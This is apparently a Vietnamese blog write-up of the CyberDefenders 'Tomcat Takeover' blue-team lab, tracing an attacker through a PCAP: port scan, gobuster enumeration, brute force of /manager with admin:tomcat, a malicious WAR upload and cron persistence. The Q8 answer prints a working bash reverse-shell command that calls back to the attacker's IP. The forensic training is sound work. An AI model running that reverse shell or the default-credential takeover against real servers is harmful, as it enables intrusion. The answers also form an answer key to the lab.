---
title: TomcatTakeover Lab
sidebar_position: 4
---

Ehe, nay tôi và cậu ấy làm bài lab nhỏ để không bị nhồi lý thuyết quá nhìu :3 sẵn tiện ôn lại Threat Intel skill lun nha. Bài [Tomcat Takeover](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/) này ở mức dễ và cũng có hướng dẫn rồi nha, mọi người nên xem qua hướng dẫn để có nhiều thông tin và chính xác hơn :v. Của tôi và cậu ấy cũng chỉ là ghi lại quá trình làm thôi à...

## Ngữ cảnh

Nhóm SOC đã xác định hoạt động đáng ngờ trên máy chủ web trong mạng nội bộ của công ty. Để hiểu rõ hơn về khai thác, họ đã nắm bắt lưu lượng mạng để phân tích. Tệp PCAP có thể chứa bằng chứng về các hoạt động độc hại dẫn đến sự thỏa hiệp của máy chủ web Apache Tomcat. Nhiệm vụ của bạn là phân tích tệp PCAP để hiểu phạm vi của cuộc tấn công.

## Công cụ sử dụng

- [Wireshark](https://www.wireshark.org/download.html): Đây là công cụ phân tích gói tin mạng miễn phí và mạnh mẽ nhất hiện nay. Wireshark cho phép theo dõi lưu lượng mạng, trích xuất dữ liệu từ file .pcap, lọc, tìm kiếm và phân tích các kết nối, yêu cầu HTTP, thông tin đăng nhập, tải lên tệp độc hại, và nhiều hoạt động khả nghi khác. Trong bài này, Wireshark được dùng để lần theo dấu vết attacker từ lúc quét cổng cho đến khi thiết lập kết nối reverse shell thành công.

## Câu hỏi

### Q1: Hãy xác định địa chỉ IP nguồn đã khởi tạo các yêu cầu này trên máy chủ của chúng ta?

Từ phân tích pcap, hoạt động đáng ngờ cho thấy một loạt yêu cầu qua nhiều cổng, gợi ý hành vi quét.

| Trả lời | 14.0.0.120 |
| ------- | ---------- |

- **Tìm cái gì:** Địa chỉ IP nguồn phát tán gói quét.
- **Tìm ở đâu:** Trong file pcap, sử dụng Wireshark.
- **Tìm thế nào:** Lọc theo địa chỉ IP (ví dụ `ip.src == x.x.x.x`), hoặc dùng Statistics → Endpoints/Conversations để xem host gửi nhiều gói nhất.

### Q2: Bạn có thể xác định thành phố nơi hoạt động của attacker bắt nguồn không?

Dựa trên địa chỉ IP attacker đã xác định,

| Trả lời | China |
| ------- | ----- |

- **Tìm cái gì:** Thành phố (city) trong thông tin WHOIS.
- **Tìm ở đâu:** Công cụ tra cứu WHOIS (whois.com, whois CLI…).
- **Tìm thế nào:** Sao chép IP vào dịch vụ WHOIS, tìm trường “City”.

### Q3: Cổng nào trong số này cung cấp quyền truy cập vào giao diện quản trị web server?

Từ phân tích pcap, nhiều cổng mở đã được phát hiện do quá trình quét.

| Trả lời | 8080 |
| ------- | ---- |

- **Tìm cái gì:** Số cổng HTTP Admin (thường là 8080 trên Tomcat).
- **Tìm ở đâu:** Trong luồng pcap giữa attacker và server.
- **Tìm thế nào:** Lọc theo IP attacker và IP server rồi xem port đích phổ biến nhất, hoặc filter `tcp.port == 8080`.

### Q4: Các công cụ nào bạn xác định được hỗ trợ attacker trong quá trình liệt kê này?

Sau khi phát hiện các cổng mở, attacker đã cố gắng liệt kê và khám phá thư mục trên web server.

| Trả lời | gobuster |
| ------- | -------- |

- **Tìm cái gì:** Tên công cụ liệt kê thư mục (User‑Agent).
- **Tìm ở đâu:** Trong tiêu đề HTTP request (User‑Agent).
- **Tìm thế nào:** Lọc HTTP GET requests, xem trường User‑Agent.

### Q5: Thư mục cụ thể nào liên quan đến admin panel mà attacker phát hiện được?

Tiếp theo nỗ lực liệt kê, attacker gửi nhiều yêu cầu để tìm giao diện quản trị.

| Trả lời | /manager |
| ------- | -------- |

- **Tìm cái gì:** Đường dẫn (path) dẫn tới admin panel (`/manager`, `/admin`…).
- **Tìm ở đâu:** Trong HTTP GET responses.
- **Tìm thế nào:** Filter `http.request.uri contains "admin"` rồi xem mã HTTP 401/200.

### Q6: Từ dữ liệu, bạn có thể xác định cặp username:password chính xác mà attacker đã dùng thành công không?

Khi truy cập vào admin panel, attacker thử brute-force đăng nhập.

| Trả lời | admin:tomcat |
| ------- | ------------ |

- **Tìm cái gì:** Basic Auth credentials (Base64).
- **Tìm ở đâu:** Trong HTTP POST hoặc header Authorization.
- **Tìm thế nào:** Filter `http.request.method == "POST"` hoặc `http.authbasic` → giải mã Base64.

### Q7: Bạn có thể xác định tên tệp độc hại này từ dữ liệu capture không?

Sau khi đăng nhập, attacker đã tải lên một tệp để thiết lập reverse shell.

| Trả lời | JXQOZY.war |
| ------- | ---------- |

- **Tìm cái gì:** Tên file được upload (ví dụ `*.war`).
- **Tìm ở đâu:** Trong HTTP POST tới `/manager/html/upload`.
- **Tìm thế nào:** Filter `http.request.uri contains "/upload"` và xem phần payload chứa tên file.

### Q8: Từ phân tích, bạn có thể xác định lệnh cụ thể mà họ lên lịch chạy để duy trì sự hiện diện không?

Sau khi thiết lập reverse shell thành công, attacker muốn duy trì truy cập.

| Trả lời | /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1' |
| ------- | ------------------------------------------------------ |
|         |                                                        |

- **Tìm cái gì:** Lệnh persistence (cronjob, systemd unit…).
- **Tìm ở đâu:** Trong nội dung reverse shell (Follow TCP Stream).
- **Tìm thế nào:** Sử dụng Follow TCP Stream trên phiên shell, tìm lệnh `crontab`, `echo "* * * * * ..."` hoặc tương tự.
